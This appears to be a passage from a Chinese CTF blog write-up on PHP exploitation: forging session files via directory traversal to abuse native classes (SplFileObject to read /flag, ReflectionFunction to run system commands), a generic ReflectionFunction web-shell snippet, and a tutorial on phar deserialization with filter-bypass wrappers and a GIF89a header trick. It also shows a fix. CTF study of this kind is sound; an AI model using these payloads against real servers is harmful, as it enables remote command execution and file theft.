<p>那么我们知道了这个类之后有什么用呢，似乎找不到可以用的地方啊，想想文件中是不是还有一个文件我们都没用上，其中必然藏有解题的关键。</p>
<pre><code class="hljs php">    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'files'</span>][<span class="hljs-variable">$filename</span>] = <span class="hljs-variable">$filepath</span>;      <span class="hljs-comment">// 将带有路径的文件名字作为键，文件路径作为值</span>
    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'paths'</span>][<span class="hljs-variable">$filepath</span>] = <span class="hljs-string">'file'</span>;         <span class="hljs-comment">// 将文件目录作为键，'file'作为值</span>
    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">'Location:/?file='</span>.<span class="hljs-variable">$filename</span>);
}</code></pre>
<p>这里把文件的名字和路径都存到了SESSION里面，但是我们能够看到<code>$_SESSION['paths'][$filepath]</code>的值是被写死了，我们无法控制，然后接着往下看</p>
<pre><code class="hljs php"><span class="hljs-variable">$filelist</span> = <span class="hljs-keyword">array</span>();
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'paths'</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$path</span>=&gt;<span class="hljs-variable">$class</span>){          <span class="hljs-comment">// 将每一个文件的路径赋值给$path,将'file'赋值给$class</span>
    <span class="hljs-variable">$temp</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$class</span>(<span class="hljs-variable">$path</span>);          <span class="hljs-comment">// 相当于new file(文件的路径)</span>
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$class</span>==<span class="hljs-string">'file'</span>){             <span class="hljs-comment">// 存在$class不等于file的情况吗？？？？</span>
        <span class="hljs-variable">$filelist</span>[] = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$temp</span>;    <span class="hljs-comment">//将返回的文件名赋值给列表</span>
    }
    <span class="hljs-keyword">else</span>{
        <span class="hljs-variable">$filelist</span>[] = <span class="hljs-variable">$temp</span>;
    }
}
<span class="hljs-variable">$out</span> = <span class="hljs-string">'&lt;p&gt;your file:'</span>;
 
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$filelist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>){
    <span class="hljs-variable">$out</span> .= <span class="hljs-variable">$value</span>.<span class="hljs-string">' '</span>;         <span class="hljs-comment">//从列表中读取输出文件名</span>
}
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$out</span>.<span class="hljs-string">'&lt;/p&gt;'</span>;</code></pre>
<p>我们可以看到，这里从<code>$_SESSION['paths']</code>数组里面把每一个键（文件的路径）赋值给<code>$path</code>,将值<code>'file'</code>赋值给<code>$class</code>，然后重点就来了，这里用动态调用的方法新建了一个类对象，看到这里是不是觉得很奇怪，在上一段代码中，已经把每一个<code>$_SESSION['paths']</code>的值已经写死了为<code>'file'</code>了，为什么这里要动态调用而不是直接<code>new file($path)</code>这种更直接的方式呢，这里很明显有问题。接着往下看，这里又用<code>if()</code>来判断<code>$class</code>的值是否是<code>'file'</code>，这就更加明显了了，<code>$class</code>的值必然又猫腻，看回代码，最后是将新建的类对象赋值给一个临时变量，然后再通过循环输出每一个值，看到这里是不是有点熟悉，这不就是<code>SplFileObject类</code>需要循环来输出每一行的值吗？于是这里几乎能肯定是通过将<code>$class</code>的值变成<code>SplFileObject</code>，来获取文件的内容。</p>
<p>既然是读取SESSION的内容，那我是否能够改变SESSION的内容呢？结合我们目录穿越的漏洞，实际上如果我们知道SESSION保存的路径和SESSION序列化的方法，那么我们实际上可以直接上传一个SESSION文件到指定的目录中，控制SESSION的内容，所以最后一个info.php文件就是让我们看SESSION保存的路径和序列化方法的。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230626152616582.png" alt="image-20230626152616582"></p>
<p>接着就是构造我们的SESSION序列化后的文件</p>
<pre><code class="hljs plaintext">paths|a:1:{s:5:"/flag";s:13:"SplFileObject";}</code></pre>
<p>这里的键为<code>/flag</code>对应代码中的<code>$path</code>，值为<code>SplFileObject</code>对应<code>$class</code>，组合起来就是<code>SplFileObject('/flag')</code>。然后文件名需要目录穿越到<code>/tmp/sess_[SSID的值]</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230626152907795.png" alt="image-20230626152907795"></p>
<p>func是一个变量，并未赋值，files变量有一个数组，其中键值filename对应./files/filename，后面的paths同理</p>
<p>这里懵逼了半天，我以为作者想靠PHP序列化引擎反序列化输入的content，弄半天只是将内容插入session文件中，这样由于他是php序列化引擎，将|看做键值分隔符，这样就path做为key，后面是值，那这一切就说通了…，与我所见不同的是，他这已经是目录穿越进入到session文件中了，因此他post写的内容就直接插入session文件，并不会被序列化处理（嗯，大概是这样吧）</p>
<p><strong>ReflectionFunction反射类</strong></p>
<p>这里是另外一个能利用的类，这个类能够直接写shell，比上面的只能读文件更加牛逼。这也应该是预期解，题目中所有的代码都用上了。</p>
<p>网上能够搜出来CTF中的用法是：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-variable">$func</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionFunction</span>(<span class="hljs-variable">$_GET</span>[m]);
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$func</span>-&gt;<span class="hljs-title function_ invoke__">invokeArgs</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$_GET</span>[c]));
<span class="hljs-meta">?&gt;</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230626165826427.png" alt="image-20230626165826427"></p>
<p>那这道题里面该怎么用这个类呢，由于要用到这个类里面的<code>invokeArgs()</code>这方法，因此要用到数组去动态调用类里面的方法。</p>
<p>example：</p>
<pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"hello "</span>.<span class="hljs-variable">$name</span>;
    }
}
<span class="hljs-variable">$t</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0</span> =&gt; <span class="hljs-variable">$t</span>,<span class="hljs-number">1</span> =&gt; <span class="hljs-string">"hello"</span>);
<span class="hljs-variable">$a</span>(<span class="hljs-string">'john'</span>);            <span class="hljs-comment">// 输出hello john</span></code></pre>
<p>这里用数组的第一个位置的值是实例化后的类，第二个位置的值是类的方法名，因此我们要的是：</p>
<pre><code class="hljs php"><span class="hljs-variable">$function</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionFunction</span>(<span class="hljs-string">'system'</span>);
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0</span> =&gt; <span class="hljs-variable">$function</span>,<span class="hljs-number">1</span> =&gt; <span class="hljs-string">"invokeArgs"</span>);
<span class="hljs-variable">$b</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0</span> =&gt; <span class="hljs-string">'whoami'</span>);
<span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);</code></pre>
<p>先实例化<code>ReflectionFunction</code>类对象，然后再构造出这两个数组，最后找到一个能够动态调用的地方。</p>
<p>再看回题目，我们在之前的分析中已经能实现能够实例化自己想要的类了。</p>
<pre><code class="hljs php">paths|a:<span class="hljs-number">1</span>:{s::<span class="hljs-string">"system"</span>;s::<span class="hljs-string">"ReflectionFunction"</span>;}</code></pre>
<p>那怎么构造出第一个数组呢，再看回这段代码：</p>
<pre><code class="hljs php"><span class="hljs-variable">$filelist</span> = <span class="hljs-keyword">array</span>();
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'paths'</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$path</span>=&gt;<span class="hljs-variable">$class</span>){          <span class="hljs-comment">// 将每一个文件的路径赋值给$path,将'file'赋值给$class</span>
    <span class="hljs-variable">$temp</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$class</span>(<span class="hljs-variable">$path</span>);          <span class="hljs-comment">// 相当于new file(文件的路径)</span>
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$class</span>==<span class="hljs-string">'file'</span>){             <span class="hljs-comment">// 存在$class不等于file的情况吗？？？？</span>
        <span class="hljs-variable">$filelist</span>[] = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$temp</span>;    <span class="hljs-comment">//将返回的文件名赋值给列表</span>
    }
    <span class="hljs-keyword">else</span>{
        <span class="hljs-variable">$filelist</span>[] = <span class="hljs-variable">$temp</span>;
    }
}</code></pre>
<p>这里已经为我们准备好了一个<code>$filelist</code>数组，在构造<code>ReflectionFunction</code>类对象的时候由于<code>$class</code>不等于字符串<code>'file'</code>，因此是直接放进了数组中，然后数组第二位我们需要是<code>'invokeArgs'</code>这个字符串，因此我们可以让<code>$class='file'</code>同时让<code>$path='invokeArgs'</code>，这样就能够返回一串字符串添加进数组里面，从而完成第一个数组的构造！</p>
<pre><code class="hljs php">paths|a:<span class="hljs-number">2</span>:{s:<span class="hljs-number">6</span>:<span class="hljs-string">"system"</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">"ReflectionFunction"</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">"invokeArgs"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"file"</span>;}</code></pre>
<p>得到<code>$filelist = array(0 =&gt; $temp,1 =&gt; "invokeArgs");</code></p>
<p>接下来就是构造第二个数组，和动态调用类方法。</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>])){
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'files'</span>][<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>]])) {      <span class="hljs-comment">//GET方法读取文件名，从session的文件名字里面寻找</span>
        <span class="hljs-variable">$pathinfo</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>]=&gt;<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'files'</span>][<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>]]);
        <span class="hljs-comment">// 构造数组</span>
        ${<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'func'</span>]}(<span class="hljs-variable">$pathinfo</span>);    <span class="hljs-comment">// 动态调用！！</span>
    }
    <span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'no such file!'</span>;
    }
}</code></pre>
<p>可以看到<code>$pathinfo</code>这里为我们构造了一个数组，并且数组的键是从GET方法获取的，而值又是从SESSION中的<code>files</code>数组里面找的，因此我们同样能够控制。</p>
<pre><code class="hljs php">files|a:<span class="hljs-number">1</span>:{i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"whoami"</span>;}</code></pre>
<p>当使用GET方法去传递<code>file=0</code>这个参数的时候就能够构造出<code>$pathinfo = array(0=&gt;'whoami')</code>。</p>
<p>最后是动态调用，这里同样是从SESSION中的<code>func</code>参数中获取值进行动态调用，因此我们只需构造<code>$_SESSION['func']='filelist'</code>即可</p>
<pre><code class="hljs php">func|s:<span class="hljs-number">8</span>:<span class="hljs-string">"filelist"</span></code></pre>
<p>综上所述，我们写进SESSION文件里面的内容是</p>
<pre><code class="hljs php">func|s:<span class="hljs-number">8</span>:<span class="hljs-string">"filelist"</span>;files|a:<span class="hljs-number">1</span>:{i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"whoami"</span>;}paths|a:<span class="hljs-number">2</span>:{s:<span class="hljs-number">6</span>:<span class="hljs-string">"system"</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">"ReflectionFunction"</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">"invokeArgs"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"file"</span>;}</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230626172929666.png" alt="image-20230626172929666"></p>
<p>这样就能够getshell了。</p>
<p><strong>修复</strong></p>
<p>修就很简单了，既然是因为目录穿越导致能够控制SESSION的内容，那么修掉目录穿越的地方就好了：</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'content'</span>])){
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>], <span class="hljs-string">'h'</span>)){            
        <span class="hljs-keyword">die</span>(<span class="hljs-string">'no h!'</span>);
    }
    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>]);
    <span class="hljs-variable">$filepath</span> = <span class="hljs-string">'./files/'</span>.<span class="hljs-variable">$filename</span>;    <span class="hljs-comment">//去掉了post，导致不可控，也就不能穿越了  </span>
    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filepath</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'content'</span>]);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>参考：<a target="_blank" rel="noopener" href="https://johnfrod.top/%E5%AE%89%E5%85%A8/ctf-%E4%B8%AD-php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">https://johnfrod.top/安全/ctf-中-php原生类的利用/</a></p>
<h2 id="0x11-phar反序列化">0x11 Phar反序列化</h2>
<p><strong>ctfshow 276</strong></p>
<p>phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。当受影响的文件操<br>
作函数调用phar文件时，会自动反序列化meta-data内的内容。</p>
<h3 id="111-什么是phar文件">11.1 什么是phar文件</h3>
<p>在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，<br>
样式表等）捆绑到一个归档文件中来实现应用程序和库的分发<br>
php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如<br>
(fopen(),copy(),file_exists()和filesize()。 phar://就是一种内置的流包装器。<br>
php中一些常见的流包装器如下：</p>
<pre><code class="hljs plaintext">file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流</code></pre>
<h3 id="112-phar文件的结构">11.2 phar文件的结构</h3>
<pre><code class="hljs plaintext">1.stub
格式为：xxx&lt;?php xxx; __HALT_COMPILER();?&gt;
前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，这部分的目的就是让 phar 扩展识别这是一个标准的 phar 文件

phar文件标志，必须包含&lt;?php __HALT_COMPILER(); ?&gt;,PHP结束标志?&gt;可以省略，但语句结束符;与stub的结尾之间不能超过两个空格。在生成phar之前应先添加stub.&lt;?php __HALT_COMPILER(); ?&gt;之前也可添加其他内容伪造成其他文件，比如GIF89a&lt;?php __HALT_COMPILER(); ?&gt;

manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。

content:这部分就是我们想要压缩在 phar 压缩包内部的文件

signature (可空):签名，放在末尾。</code></pre>
<p>manifest 存放phar归档信息.Manifest结构如下图 所有未使用的标志保留，供将来使用，并且不得用于存储自定义信息。使用每个文件的元数据功能来存储有关特定文件的自定义信息.</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230727170910134.png" alt="image-20230727170910134"></p>
<p>下面生成一个phar文件<br>
前提：开启php.ini中的 <strong>phar.readonly = off</strong></p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>{
    }

    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">"phar.phar"</span>);
    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">"phar.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span>
    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();
    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="hljs-comment">//设置stub</span>
    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();
    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span>
    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//添加要压缩的文件</span>
    <span class="hljs-comment">//签名自动计算</span>
    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();
<span class="hljs-meta">?&gt;</span></code></pre>
<h3 id="113-漏洞利用条件">11.3 漏洞利用条件</h3>
<ol>
<li>phar文件要能够上传到服务器端。</li>
<li>要有可用的魔术方法作为“跳板”。</li>
<li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li>
</ol>
<h3 id="114-受影响的函数">11.4 受影响的函数：</h3>
<p><a target="_blank" rel="noopener" href="https://blog.zsxsoft.com/post/38">https://blog.zsxsoft.com/post/38</a></p>
<p>php中的大部分与文件操作相关函数在通过phar协议获取数据时会将phar文件的meta-data部分反序列化</p>
<table>
<thead>
<tr>
<th style="text-align:left">受影响的函数列表</th>
<th style="text-align:left"></th>
<th style="text-align:left"></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">fileatime</td>
<td style="text-align:left">filectime</td>
<td style="text-align:left">file_exists</td>
<td>file_get_contents</td>
</tr>
<tr>
<td style="text-align:left">file_put_contents</td>
<td style="text-align:left">file</td>
<td style="text-align:left">filegroup</td>
<td>fopen</td>
</tr>
<tr>
<td style="text-align:left">fileinode</td>
<td style="text-align:left">filemtime</td>
<td style="text-align:left">fileowner</td>
<td>fikeperms</td>
</tr>
<tr>
<td style="text-align:left">is_dir</td>
<td style="text-align:left">is_executable</td>
<td style="text-align:left">is_file</td>
<td>is_link</td>
</tr>
<tr>
<td style="text-align:left">is_readable</td>
<td style="text-align:left">is_writable</td>
<td style="text-align:left">is_writeable</td>
<td>parse_ini_file</td>
</tr>
<tr>
<td style="text-align:left">copy</td>
<td style="text-align:left">unlink</td>
<td style="text-align:left">stat</td>
<td>readfile</td>
</tr>
</tbody>
</table>
<h3 id="115-绕过方式">11.5 绕过方式</h3>
<p>当环境限制了phar不能出现在前面的字符里。可以使用<code>compress.bzip2://</code>和<code>compress.zlib://</code>等绕过</p>
<pre><code class="hljs PHP">compress.bzip:<span class="hljs-comment">//phar:///test.phar/test.txt</span>
compress.bzip2:<span class="hljs-comment">//phar:///test.phar/test.txt</span>
compress.zlib:<span class="hljs-comment">//phar:///home/sx/test.phar/test.txt</span>
php:<span class="hljs-comment">//filter/resource=phar:///test.phar/test.txt</span></code></pre>
<p>当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。<br>
php://filter/read=convert.base64-encode/resource=phar://phar.phar<br>
GIF格式验证可以通过在文件头部添加GIF89a绕过<br>
1、$phar-&gt;setStub(“GIF89a”.“”); //设置stub<br>
2、生成一个phar.phar，修改后缀名为phar.g</p>
<p>实战参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6699#toc-4">https://xz.aliyun.com/t/6699#toc-4</a></p>
<h3 id="116-从-php-源码探索-phar-利用成功的深层原因">11.6 从 PHP 源码探索 phar 利用成功的深层原因</h3>
<h4 id="1-php-流的概念">1. PHP 流的概念</h4>
<p>流的作用是在出发地和目的地之间传输数据。出发地和目的地可以是文件、命令行进程、网络连接、ZIP 或 TAR 压缩文件、临时内存、标准输入或输出，或者是通过 <strong>PHP 流封装协议</strong>实现的任何其他资源。</p>
<p>如果你读写过文件，就用过流；如果你从 php://stdin 读取过数据，或者把输入写入 php://stdout，也用过流。流为 PHP 的很多 IO 函数提供了底层实现，如 file_get_contents、fopn、fread 和 fwrite 等。<strong>PHP 的流函数提供了不同资源的统一接口。</strong></p>
<p>我们可以把流比作管道，把水（资源数据）从一个地方引到另一个地方。在水从出发地到目的地的过程中，我们可以过滤水，可以改变水质，可以添加水，也可以排出水。</p>
<h4 id="2-流封装协议wrapper">2. 流封装协议（wrapper）</h4>
<p>因为流式数据的种类各异，而每种类型需要独特的协议，以便读写数据，我们称这些协议为流封装协议。例如，我们可以读写文件系统，可以通过 HTTP、HTTPS 或 SSH 与远程 Web 服务器通信，还可以打开并读写 ZIP、RAR 或 PHAR 压缩文件</p>
<p>虽然过程是一样的，但是读写文件系统中文件的方式与收发 HTTP 消息的方式有所不同，流封装协议的作用是使用通用的接口封装这种差异。</p>
<p>每个流都有一个协议和一个目标。指定协议和目标的方法是使用流标识符：<code>&lt;scheme&gt;://&lt;target&gt;</code>，其中 <code>&lt;scheme&gt;</code> 是流的封装协议，<code>&lt;target&gt;</code> 是流的数据源。</p>
<h5 id="21-http流封装协议">2.1 <a target="_blank" rel="noopener" href="http://xn--ykr35rr2oc4zqbd">http://流封装协议</a></h5>
<p>下面使用 HTTP 流封装协议创建了一个与 Flicker API 通信的 PHP 流：</p>
<pre><code class="hljs plaintext">&lt;?php
$json = file_get_contents(
    'http://api.flickr.com/services/feeds/photos_public.gne?format=json'
);</code></pre>
<p>不要以为这是普通的网页 URL，file_get_contents() 函数的字符串参数其实是一个流标识符。http 协议会让 PHP 使用 HTTP 流封装协议，在这个参数中，http 之后是流的目标。</p>
<blockquote>
<p>注：很多 PHP 开发者可能并不知道普通的 URL 其实是 PHP 流封装协议标识符的伪装。</p>
</blockquote>
<h5 id="22-file流封装协议">2.2 file://流封装协议</h5>
<p>我们通常使用 file_get_contents()、fopen()、fwrite() 和 fclose() 等函数读写文件系统，<strong>因为 PHP 默认使用的流封装协议是 file://</strong>，所以我们很少认为这些函数使用的是 PHP 流。下面的示例演示了使用 file:// 流封装协议创建一个读写 /etc/hosts 文件的流：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$handle</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">'file:///etc/hosts'</span>, <span class="hljs-string">'rb'</span>);
<span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$handle</span>) !== <span class="hljs-literal">TRUE</span>) {
        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$handle</span>);
}
<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$handle</span>);</code></pre>
<p><strong>我们通常会省略掉 file:// 协议，因为这是 PHP 使用的默认值。</strong></p>
<p>这两段介绍来源于<a target="_blank" rel="noopener" href="https://laravelacademy.org/post/7459.html%EF%BC%8C%E9%82%A3%E4%B9%88%E8%BF%99%E4%B8%AA%E8%AF%B4%E6%98%8E%E4%BA%86%E4%B8%80%E4%B8%AA%E4%BB%80%E4%B9%88%E9%97%AE%E9%A2%98%E5%91%A2%EF%BC%9F%E8%AF%B4%E6%98%8E%E6%88%91%E4%BB%ACPHP">https://laravelacademy.org/post/7459.html，那么这个说明了一个什么问题呢？说明我们PHP</a> 目前的几乎所有的 I/O 操作都是通过流配合流包装器来实现的，<strong>因为 PHP 默认的包装器就是 file://</strong> ，虽然你没写，但是底层 PHP 还是通过流包装器实现的。</p>
<p><strong>还有更多</strong></p>
<p>使用 <strong>stream_get_wrappers()</strong> 获取当前系统注册的全部 wrapper</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230624171722589.png" alt="image-20230624171722589"></p>
<h4 id="3-开始向下挖掘">3. 开始向下挖掘</h4>
<p>我们上面说了，phar 文件中存在我们可控的序列化的内容，然后我们又说，这个内容在 文件系统函数 配合 phar:// 的时候能实现反序列化，但是我们没说为什么，这也就是我们这节讨论的重点，所有的原因都能从源代码找到答案</p>
<p><strong>(1)先看一下 Phar 文件源代码部分</strong></p>
<p>因为 Phar 是 PHP 的一个扩展，于是我们在 GitHub 的 php-src/ext/phar/phar.c 去全局搜索 <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618">unserailize()</a> 函数</p>
<p><strong>如图所示：</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230624171836907.png" alt="image-20230624171836907"></p>
<p><strong>(2)但是这个函数为什么能调用呢</strong></p>
<p>这就涉及到了文件系统函数的部分了，我们找一下源码，位置在 Github php-src/ext/standard/file.c<br>
这个文件包含了非常多的文件函数的实现，我们先全局搜索 <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/PHP-7.2.11/ext/standard/file.c#L519">file_get_contents</a></p>
<p><strong>如图所示：</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230624171935674.png" alt="image-20230624171935674"></p>
<p>然后我们稍微往下翻翻就能发现和<a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/PHP-7.2.11/ext/standard/file.c#L550">处理 wrapper 流相关的函数</a></p>
<p><strong>如图所示：</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230624172000090.png" alt="image-20230624172000090"></p>
<p>我们发现了这个 php)stream_open_wrapper_ex 这个函数能处理我们的 wrapper ，那么其他的类似的函数是不是也是底层调用了这个函数呢？</p>
<p><strong>(3)由此及彼</strong></p>
<p>我们全局搜索一下 <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/master/ext/standard/file.c#L871">fopen()</a>，然后我们看一下具体的实现</p>
<p><strong>如图所示：</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230624172153661.png" alt="image-20230624172153661"></p>
<p>是不是很熟悉？这下好了，我们不如把 PHP 源码下载下来，来一个真正的全局搜索</p>
<p><strong>(4)举一反三</strong></p>
<p>我本地使用 sublime text 对整个 PHP 源码进行了扫描，发现了很多很多地方调用了这个函数，其实并不只是我们常见的 文件系统函数</p>
<p><strong>如图所示：</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230624172259036.png" alt="image-20230624172259036"></p>
<p>好家伙，太底层了，看不懂了，日后拜读</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#4-phar-%E7%9A%84%E5%AE%9E%E6%88%98">https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/#4-phar-的实战</a></p>
